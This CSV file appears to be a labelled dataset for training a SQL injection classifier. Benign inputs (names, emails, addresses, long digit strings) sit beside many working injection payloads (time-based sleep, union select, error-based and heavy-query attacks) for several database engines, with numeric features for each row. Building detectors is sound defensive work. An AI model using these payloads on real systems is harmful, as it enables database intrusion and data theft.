Query,Label,Query_preprocessed,qlen,wcount,sq,dq,puncts,comments,spaces,logic,arith,alpha,sqlkw,sqlfunc
toroborg@cpanelweb.kp,0,toroborg cpanelweb kp,21,3,0,0,2,0,0,0,0,19,0,0
"1"") rlike (select * from (select(sleep(5)))vwyq)#",1,rlike select from select sleep vwyq,49,6,0,1,1,1,5,0,1,30,4,1
-9622'))) order by 1#,1,order by,21,2,1,0,1,1,3,0,1,7,2,0
olmstead@ballerpoker.tr,0,olmstead ballerpoker tr,23,3,0,0,2,0,0,0,0,21,0,0
carteado,0,carteado,8,1,0,0,0,0,0,0,0,8,0,0
"1) where 7571=7571 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1,where and char char char char regexp_substring repeat right char null,126,11,0,0,12,1,4,1,2,58,4,8
62tiba74,0,62tiba74,8,1,0,0,0,0,0,0,0,4,0,0
fluvia,0,fluvia,6,1,0,0,0,0,0,0,0,6,0,0
"manuel arnus, 151 9?b",0,manuel arnus,21,2,0,0,2,0,3,0,0,12,0,0
1') as pudv where 2609=2609;(select * from (select(sleep(5)))srmq)--,1,as pudv where select from select sleep srmq,68,8,1,0,2,1,7,0,3,36,5,1
1136300423547186,0,,16,0,0,0,0,0,0,0,0,0,0,0
villanueva del rebollar,0,villanueva del rebollar,23,3,0,0,0,0,2,0,0,21,0,0
1%')));begin user_lock.sleep(5); end--,1,begin user_lock sleep end,38,4,1,0,5,1,2,0,2,21,2,1
"-2855""))) union all select 1496,1496,1496,1496#",1,union all select,47,3,0,1,4,1,4,0,1,14,3,0
8721,0,,4,0,0,0,0,0,0,0,0,0,0,0
noris,0,noris,5,1,0,0,0,0,0,0,0,5,0,0
1' and sleep(5) and 'pfgy'='pfgy,1,and sleep and pfgy pfgy,32,5,4,0,1,0,4,2,0,19,2,1
satandera,0,satandera,9,1,0,0,0,0,0,0,0,9,0,0
1';begin user_lock.sleep(5); end--,1,begin user_lock sleep end,34,4,1,0,4,1,2,0,2,21,2,1
23291292c,0,23291292c,9,1,0,0,0,0,0,0,0,1,0,0
"-5032' or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",1,or ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr,201,22,1,0,25,0,12,1,1,80,8,10
othella,0,othella,7,1,0,0,0,0,0,0,0,7,0,0
altavista@hojainformativa.com.tz,0,altavista hojainformativa com tz,32,4,0,0,3,0,0,0,0,29,0,0
coder,0,coder,5,1,0,0,0,0,0,0,0,5,0,0
villar de caas,0,villar de caas,14,3,0,0,0,0,2,0,0,12,0,0
"1""))) union all select null,null,null,null,null,null,null,null,null,null--",1,union all select null null null null null null null null null null,74,13,0,1,9,1,4,0,2,54,13,0
78912457d,0,78912457d,9,1,0,0,0,0,0,0,0,1,0,0
ezio,0,ezio,4,1,0,0,0,0,0,0,0,4,0,0
pedemonte@mystyleperfume.th,0,pedemonte mystyleperfume th,27,3,0,0,2,0,0,0,0,25,0,0
bolvir,0,bolvir,6,1,0,0,0,0,0,0,0,6,0,0
79365532f,0,79365532f,9,1,0,0,0,0,0,0,0,1,0,0
pl. juan xxiii 197,0,pl juan xxiii,18,3,0,0,1,0,3,0,0,11,0,0
mallott@edifico.bf,0,mallott edifico bf,18,3,0,0,2,0,0,0,0,16,0,0
"1 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)# hlrg",1,and select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4 hlrg,113,21,0,0,9,1,14,1,1,76,7,1
alexiana,0,alexiana,8,1,0,0,0,0,0,0,0,8,0,0
siddell,0,siddell,7,1,0,0,0,0,0,0,0,7,0,0
"-2027%"") union all select 2048,2048,2048,2048,2048,2048,2048,2048#",1,union all select,66,3,0,1,9,1,4,0,1,14,3,0
"-9634'))) union all select 4141,4141#",1,union all select,37,3,1,0,2,1,4,0,1,14,3,0
"1%') or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,or select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7,156,25,1,0,8,1,19,1,3,108,10,1
llasera,0,llasera,7,1,0,0,0,0,0,0,0,7,0,0
takahash,0,takahash,8,1,0,0,0,0,0,0,0,8,0,0
"1) as xuvz where 3061=3061 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,as xuvz where or select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4,133,23,0,0,9,1,17,1,3,82,9,1
filogamo@copiar.com.nu,0,filogamo copiar com nu,22,4,0,0,3,0,0,0,0,19,0,0
06700,0,,5,0,0,0,0,0,0,0,0,0,0,0
"-9031%"") order by 1--",1,order by,21,2,0,1,1,1,3,0,3,7,2,0
"-6475""))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""mdsx"" like ""mdsx",1,or select upper xmltype chr chr chr chr chr chr chr select case when then else end from dual chr chr chr chr chr chr from dual and mdsx like mdsx,265,31,0,4,28,0,19,2,1,115,12,15
-6100') as kvfc where 2377=2377 or 6872=6872--,1,as kvfc where or,46,4,1,0,2,1,6,1,3,13,3,0
42287106l,0,42287106l,9,1,0,0,0,0,0,0,0,1,0,0
gor,0,gor,3,1,0,0,0,0,0,0,0,3,0,0
koline.mathieson@viavilano.lv,0,koline mathieson viavilano lv,29,4,0,0,3,0,0,0,0,26,0,0
1)) as bjxd where 4299=4299;select pg_sleep(5)--,1,as bjxd where select pg_sleep,48,5,0,0,3,1,5,0,2,24,3,1
maestro vitoria 10,0,maestro vitoria,18,2,0,0,0,0,2,0,0,14,0,0
y,0,,2,0,0,0,0,0,0,0,0,1,0,0
1)) and 3228=7376#,1,and,18,1,0,0,2,1,2,1,0,3,0,0
bau pelayo,0,bau pelayo,10,2,0,0,0,0,1,0,0,9,0,0
carraspeo,0,carraspeo,9,1,0,0,0,0,0,0,0,9,0,0
׎8,0,,2,0,0,0,0,0,0,0,0,0,0,0
1534175885053234,0,,16,0,0,0,0,0,0,0,0,0,0,0
mallki,0,mallki,6,1,0,0,0,0,0,0,0,6,0,0
das,0,das,3,1,0,0,0,0,0,0,0,3,0,0
perl,0,perl,4,1,0,0,0,0,0,0,0,4,0,0
"1"")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (((""mubt""=""mubt",1,select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3 and mubt mubt,115,18,0,4,7,0,11,1,1,80,6,1
"-3460%""))) or 9323=9323#",1,or,24,1,0,1,3,1,2,1,1,2,0,0
06640,0,,5,0,0,0,0,0,0,0,0,0,0,0
576,0,,3,0,0,0,0,0,0,0,0,0,0,0
ermindo,0,ermindo,7,1,0,0,0,0,0,0,0,7,0,0
"1%"")));select pg_sleep(5)--",1,select pg_sleep,27,2,0,1,3,1,1,0,2,13,1,1
"1"") procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1,procedure analyse extractvalue concat 0x5c benchmark md5 0x4b774c75,94,8,0,1,5,1,2,0,0,50,0,6
lauraine,0,lauraine,8,1,0,0,0,0,0,0,0,8,0,0
2mpav8nar,0,2mpav8nar,9,1,0,0,0,0,0,0,0,7,0,0
,0,,0,0,0,0,0,0,0,0,0,0,0,0
reiner,0,reiner,6,1,0,0,0,0,0,0,0,6,0,0
"1"")) as nsbu where 6569=6569 or sleep(5)#",1,as nsbu where or sleep,41,5,0,1,2,1,6,1,0,18,3,1
henche,0,henche,6,1,0,0,0,0,0,0,0,6,0,0
bardana,0,bardana,7,1,0,0,0,0,0,0,0,7,0,0
1))) or sleep(5) and (((2209=2209,1,or sleep and,33,3,0,0,1,0,4,2,0,10,2,1
anaya pez,0,anaya pez,9,2,0,0,0,0,1,0,0,8,0,0
"1))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,and select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4,112,20,0,0,8,1,13,1,3,72,7,1
pablo iglesias s/n 2?f,0,pablo iglesias,22,2,0,0,1,0,3,0,1,16,0,0
"1"" where 6352=6352;begin dbms_lock.sleep(5); end--",1,where begin dbms_lock sleep end,50,5,0,1,5,1,4,0,2,26,3,1
"1'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('kpsg' like 'kpsg",1,and char char char char regexp_substring repeat left crypt_key char char char null null and kpsg like kpsg,169,18,4,0,17,0,6,2,0,87,6,11
khariton,0,khariton,8,1,0,0,0,0,0,0,0,8,0,0
dorian,0,dorian,6,1,0,0,0,0,0,0,0,6,0,0
puente del congosto,0,puente del congosto,19,3,0,0,0,0,2,0,0,17,0,0
"-9263') as qodg where 6798=6798 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1,as qodg where or ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr,228,25,1,0,26,1,16,1,3,91,10,10
"1))) and 8407=(select count(*) from generate_series(1,5000000)) and (((1729=1729",1,and select count from generate_series and,80,6,0,0,4,0,7,2,1,35,4,1
1er87n30689,0,1er87n30689,11,1,0,0,0,0,0,0,0,3,0,0
espnola claudio,0,espnola claudio,15,2,0,0,0,0,1,0,0,14,0,0
2243766198035370,0,,16,0,0,0,0,0,0,0,0,0,0,0
d_eslechar,0,d_eslechar,10,1,0,0,1,0,0,0,0,9,0,0
9raspun9e,0,9raspun9e,9,1,0,0,0,0,0,0,0,7,0,0
samia,0,samia,5,1,0,0,0,0,0,0,0,5,0,0
alegrante,0,alegrante,9,1,0,0,0,0,0,0,0,9,0,0
38435,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1"")))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (((""kfdh"" like ""kfdh",1,select case when then regexp_substring repeat left crypt_key char char char null null else char char char char end from values and kfdh like kfdh,227,25,0,4,17,0,14,1,0,119,13,11
"1"")) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((""kvpy""=""kvpy",1,and exp select from select concat 0x7171706a71 select elt 0x717a767a71 0x78 and kvpy kvpy,126,14,0,4,7,0,9,2,1,55,6,3
84428224p,0,84428224p,9,1,0,0,0,0,0,0,0,1,0,0
@,0,,1,0,0,0,1,0,0,0,0,0,0,0
a24a70re8a,0,a24a70re8a,10,1,0,0,0,0,0,0,0,5,0,0
"1""));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((""zzmn""=""zzmn",1,select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4 and zzmn zzmn,118,22,0,4,9,0,13,1,1,80,7,1
"1"") or 6793=(select 6793 from pg_sleep(5)) and (""baia""=""baia",1,or select from pg_sleep and baia baia,60,7,0,4,3,0,7,2,0,30,4,1
"1"" where 6200=6200 and elt(1210=1210,sleep(5))--",1,where and elt sleep,48,4,0,1,3,1,4,1,2,16,2,2
"-7333%""))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (((""%""=""",1,or qqpjq select case when then else end from rdb database qzvzq and,116,13,4,4,9,0,15,2,1,55,9,1
fl5ct499t1,0,fl5ct499t1,10,1,0,0,0,0,0,0,0,5,0,0
-8057')) as gpue where 4205=4205 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,1,as gpue where or cast chr chr chr chr chr select case when then else end text chr chr chr chr chr as numeric,220,24,1,0,25,1,16,1,3,85,10,10
1' where 4795=4795 and 4595=4595#,1,where and,33,2,1,0,3,1,4,1,0,8,2,0
casarabonela,0,casarabonela,12,1,0,0,0,0,0,0,0,12,0,0
28191,0,,5,0,0,0,0,0,0,0,0,0,0,0
hr,0,hr,2,1,0,0,0,0,0,0,0,2,0,0
simhan,0,simhan,6,1,0,0,0,0,0,0,0,6,0,0
"1"") as wsyv where 8142=8142 rlike sleep(5)#",1,as wsyv where rlike sleep,43,5,0,1,2,1,6,0,0,21,3,1
"1"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((""ekbq""=""ekbq",1,select count from domain domains as t1 domain columns as t2 domain tables as t3 and ekbq ekbq,108,18,0,4,7,0,11,1,1,73,6,1
"1' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and 'egye'='egye",1,and char char char char regexp_substring repeat right char null and egye egye,127,13,4,0,12,0,4,2,0,64,4,8
cuacos de yuste,0,cuacos de yuste,15,3,0,0,0,0,2,0,0,13,0,0
darns cabrianes,0,darns cabrianes,15,2,0,0,0,0,1,0,0,14,0,0
-8112'))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('xopg'='xopg,1,or cast chr chr chr chr chr select case when then else end text chr chr chr chr chr as numeric and xopg xopg,215,24,4,0,25,0,14,2,1,85,9,10
"1"")) as qqhm where 7182=7182;if(7899=7899) select 7899 else drop function zbbp--",1,as qqhm where if select else drop function zbbp,80,9,0,1,3,1,10,0,2,39,6,1
"1'))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('zoxm' like 'zoxm",1,and select count from domain domains as t1 domain columns as t2 domain tables as t3 and zoxm like zoxm,124,20,4,0,6,0,15,2,1,80,8,1
"1') as oknw where 8777=8777;iif(4836=1823,1,1/0)",1,as oknw where iif,48,4,1,0,5,0,4,0,1,14,2,0
"la fragua 158, 11-e",0,la fragua,19,2,0,0,1,0,3,0,1,9,0,0
atab?a6ad7,0,atab a6ad7,10,2,0,0,1,0,0,0,0,7,0,0
palacn aucapia,0,palacn aucapia,14,2,0,0,0,0,1,0,0,13,0,0
75730563g,0,75730563g,9,1,0,0,0,0,0,0,0,1,0,0
nickie,0,nickie,6,1,0,0,0,0,0,0,0,6,0,0
drayton,0,drayton,7,1,0,0,0,0,0,0,0,7,0,0
marshaus,0,marshaus,8,1,0,0,0,0,0,0,0,8,0,0
"c/ caceres, 74,",0,caceres,15,1,0,0,2,0,2,0,1,8,0,0
"1') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('cpfn' like 'cpfn",1,or select count from domain domains as t1 domain columns as t2 domain tables as t3 and cpfn like cpfn,119,20,4,0,6,0,15,2,1,79,8,1
1) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq'),1,and qqpjq select case when then else end from rdb database qzvzq,96,12,4,0,6,0,13,1,0,53,8,1
"1"" where 1537=1537 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",1,where and select from select count concat 0x7171706a71 select elt 0x717a767a71 floor rand from information_schema character_sets group by,191,18,0,1,10,1,13,1,4,102,9,5
"-2821""))) union all select 3920,3920,3920,3920,3920,3920,3920#",1,union all select,62,3,0,1,7,1,4,0,1,14,3,0
lauderda,0,lauderda,8,1,0,0,0,0,0,0,0,8,0,0
01839,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1"")) as bosq where 4695=4695;select benchmark(5000000,md5(0x714e4153))#",1,as bosq where select benchmark md5 0x714e4153,71,7,0,1,4,1,5,0,0,30,3,2
"jose muoz san roman, s/n,",0,jose muoz san roman,25,4,0,0,2,0,4,0,1,18,0,0
janenna,0,janenna,7,1,0,0,0,0,0,0,0,7,0,0
"1"") as rnte where 6517=6517 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,as rnte where and select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4,135,23,0,1,9,1,17,1,3,83,9,1
"1""))) and make_set(7809=9564,9564) and (((""jggk"" like ""jggk",1,and make_set and jggk like jggk,59,6,0,4,3,0,6,2,0,25,3,1
"av. doa urraca, 31,",0,av doa urraca,19,3,0,0,3,0,3,0,0,11,0,0
g,0,,1,0,0,0,0,0,0,0,0,1,0,0
fors,0,fors,4,1,0,0,0,0,0,0,0,4,0,0
"1)) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((6829=6829",1,or like abcdefg upper hex randomblob and,79,7,2,0,3,0,4,2,1,34,3,3
"1%""));begin user_lock.sleep(5); end and ((""%""=""",1,begin user_lock sleep end and,47,5,0,4,7,0,4,1,0,24,3,1
49625,0,,5,0,0,0,0,0,0,0,0,0,0,0
"romejal carrascal, 48, 3?d",0,romejal carrascal,26,2,0,0,3,0,3,0,0,17,0,0
iafrate ciavaglia,0,iafrate ciavaglia,17,2,0,0,0,0,1,0,0,16,0,0
torrent refojo,0,torrent refojo,14,2,0,0,0,0,1,0,0,13,0,0
heidepri,0,heidepri,8,1,0,0,0,0,0,0,0,8,0,0
"-6086"" union all select 8700,8700,8700,8700--",1,union all select,45,3,0,1,3,1,4,0,3,14,3,0
"calle juan de mena, 133",0,calle juan de mena,23,4,0,0,1,0,4,0,0,15,0,0
24248,0,,5,0,0,0,0,0,0,0,0,0,0,0
"cubo de tierra del vino, el",0,cubo de tierra del vino el,27,6,0,0,1,0,5,0,0,21,0,0
85nefici0r3o,0,85nefici0r3o,12,1,0,0,0,0,0,0,0,8,0,0
rea+tino,0,rea tino,8,2,0,0,0,0,0,0,1,7,0,0
"1%"");select (case when (5163=4861) then 1 else 5163*(select 5163 from master..sysdatabases) end)--",1,select case when then else select from master sysdatabases end,98,10,0,1,5,1,11,0,3,53,8,0
magdi,0,magdi,5,1,0,0,0,0,0,0,0,5,0,0
ali,0,ali,3,1,0,0,0,0,0,0,0,3,0,0
-1280')) or 8571=8571--,1,or,23,1,1,0,1,1,2,1,3,2,0,0
9755,0,,4,0,0,0,0,0,0,0,0,0,0,0
"1) and elt(7425=8842,8842) and (9194=9194",1,and elt and,41,3,0,0,3,0,4,2,0,9,2,1
"calle santa teresa, 87 5?b",0,calle santa teresa,26,3,0,0,2,0,4,0,0,17,0,0
"1"") where 4660=4660 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,where or select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5,117,15,0,1,11,1,12,1,3,67,4,1
snips,0,snips,5,1,0,0,0,0,0,0,0,5,0,0
caada del hoyo,0,caada del hoyo,14,3,0,0,0,0,2,0,0,12,0,0
"-2424) where 8132=8132 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1,where or ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr,219,23,0,0,26,1,14,1,3,85,9,10
1'||(select 'qtep' where 2572=2572 or (select * from (select(sleep(5)))sddo)#,1,select qtep where or select from select sleep sddo,77,9,3,0,4,1,8,1,1,42,6,1
lezama,0,lezama,6,1,0,0,0,0,0,0,0,6,0,0
"1' and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and 'pphf'='pphf",1,and extractvalue concat 0x5c 0x7171706a71 select elt 0x717a767a71 and pphf pphf,109,11,4,0,7,0,5,2,0,48,3,3
jaki,0,jaki,4,1,0,0,0,0,0,0,0,4,0,0
cobo,0,cobo,4,1,0,0,0,0,0,0,0,4,0,0
"av. benisa 43, 10d",0,av benisa 10d,18,3,0,0,2,0,3,0,0,9,0,0
casanova dot,0,casanova dot,12,2,0,0,0,0,1,0,0,11,0,0
"1') where 6092=6092;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,where call regexp_substring repeat left crypt_key char char char null null,120,11,1,0,12,1,3,0,2,62,5,7
"-2460%"") or (2660=5767)*5767 and (""%""=""",1,or and,39,2,0,4,4,0,4,2,2,5,2,0
ensacad$ora,0,ensacad ora,11,2,0,0,1,0,0,0,0,10,0,0
6966776615880147,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1') as ccee where 8880=8880 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,as ccee where and select count from domain domains as t1 domain columns as t2 domain tables as t3,123,19,1,0,7,1,15,1,3,76,8,1
"calle padre payan 127,",0,calle padre payan,22,3,0,0,1,0,3,0,0,15,0,0
-9202' where 9799=9799 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,1,where or dbms_utility sqlid_to_sqlhash chr chr chr chr chr select case when then else end from dual chr chr chr chr chr,226,22,1,0,27,1,14,1,3,95,9,12
duilio,0,duilio,6,1,0,0,0,0,0,0,0,6,0,0
1' where 8099=8099;waitfor delay '0:0:5'--,1,where waitfor delay,42,3,3,0,4,1,4,0,2,17,1,2
"1"") where 1870=1870 union all select null,null,null,null,null,null,null,null--",1,where union all select null null null null null null null null,78,12,0,1,8,1,6,0,2,51,12,0
woodworth_balchowsky@faders.com.bf,0,woodworth_balchowsky faders com bf,34,4,0,0,4,0,0,0,0,30,0,0
1') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('ohqs' like 'ohqs,1,and qqpjq select case when then else end from rdb database qzvzq and ohqs like ohqs,120,16,8,0,6,0,17,2,0,68,10,1
0233016491701103,0,,16,0,0,0,0,0,0,0,0,0,0,0
h78n7ce30,0,h78n7ce30,9,1,0,0,0,0,0,0,0,4,0,0
recobracin,0,recobracin,10,1,0,0,0,0,0,0,0,10,0,0
e4te9ad2,0,e4te9ad2,8,1,0,0,0,0,0,0,0,5,0,0
gronwall,0,gronwall,8,1,0,0,0,0,0,0,0,8,0,0
"1"")) as tmpz where 7224=7224 and make_set(3579=1045,1045)--",1,as tmpz where and make_set,59,5,0,1,4,1,6,1,2,21,3,1
-7561) as ilrm where 8828=8828 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,1,as ilrm where or qqpjq select case when then else end from rdb database qzvzq,125,15,4,0,7,1,17,1,3,63,10,1
8120300504791286,0,,16,0,0,0,0,0,0,0,0,0,0,0
huelva,0,huelva,6,1,0,0,0,0,0,0,0,6,0,0
"1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('yaml'='yaml",1,call regexp_substring repeat left crypt_key char char char null null and yaml yaml,122,13,4,0,12,0,3,1,0,68,5,7
"c/ berruguete 23,",0,berruguete,17,1,0,0,1,0,2,0,1,11,0,0
nathalia,0,nathalia,8,1,0,0,0,0,0,0,0,8,0,0
"1',iif(7475=7475,1,1/0)",1,iif,23,1,1,0,4,0,0,0,1,3,0,0
baudoin,0,baudoin,7,1,0,0,0,0,0,0,0,7,0,0
menngea,0,menngea,7,1,0,0,0,0,0,0,0,7,0,0
robieux,0,robieux,7,1,0,0,0,0,0,0,0,7,0,0
㭺,0,,1,0,0,0,0,0,0,0,0,0,0,0
"1')) as fjbe where 4662=4662 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,as fjbe where or select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4,135,23,1,0,9,1,17,1,3,82,9,1
"1%');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1,select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4,101,19,1,0,9,1,11,0,3,69,6,1
28190,0,,5,0,0,0,0,0,0,0,0,0,0,0
terhune@multireform.tn,0,terhune multireform tn,22,3,0,0,2,0,0,0,0,20,0,0
"1' in boolean mode);select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1,in boolean mode select dbms_pipe receive_message chr chr chr chr from dual,104,12,1,0,11,1,6,0,2,61,3,6
"1%"") or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (""%""=""",1,or exp select from select concat 0x7171706a71 select elt 0x717a767a71 0x78 and,117,12,0,4,9,0,9,2,1,46,6,3
malva,0,malva,5,1,0,0,0,0,0,0,0,5,0,0
"1')) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1,and char char char char regexp_substring repeat right char null,112,10,1,0,11,1,2,1,2,53,3,8
borque clua,0,borque clua,11,2,0,0,0,0,1,0,0,10,0,0
yepes@enla.mg,0,yepes enla mg,13,3,0,0,2,0,0,0,0,11,0,0
81717068t,0,81717068t,9,1,0,0,0,0,0,0,0,1,0,0
rooso,0,rooso,5,1,0,0,0,0,0,0,0,5,0,0
8533,0,,4,0,0,0,0,0,0,0,0,0,0,0
"1%"" and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""%""=""",1,and convert int select char char char char char select case when then char else char end char char char char char and,209,23,0,4,6,0,13,2,10,95,9,12
8049477483692914,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1'+(select 'mgrj' where 8514=8514 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x))+'",1,select mgrj where or row select count concat 0x7171706a71 select elt 0x717a767a71 floor rand from select union select union select union select group by,237,24,4,0,9,0,22,1,5,113,15,5
"-2013"")) as kisy where 3802=3802 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--",1,as kisy where or qqpjq select case when then else end from rdb database qzvzq,127,15,4,1,7,1,17,1,3,63,10,1
1'+(select dklj where 3265=3265;select sleep(5)#,1,select dklj where select sleep,48,5,1,0,3,1,4,0,1,26,3,1
yaser,0,yaser,5,1,0,0,0,0,0,0,0,5,0,0
"1);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1,select count from domain domains as t1 domain columns as t2 domain tables as t3,87,15,0,0,6,1,9,0,3,62,5,1
daciano,0,daciano,7,1,0,0,0,0,0,0,0,7,0,0
espana@flabingo.dk,0,espana flabingo dk,18,3,0,0,2,0,0,0,0,16,0,0
1611608298925836,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1) and elt(1210=1210,sleep(5))",1,and elt sleep,30,3,0,0,2,0,2,1,0,11,1,2
alcantud,0,alcantud,8,1,0,0,0,0,0,0,0,8,0,0
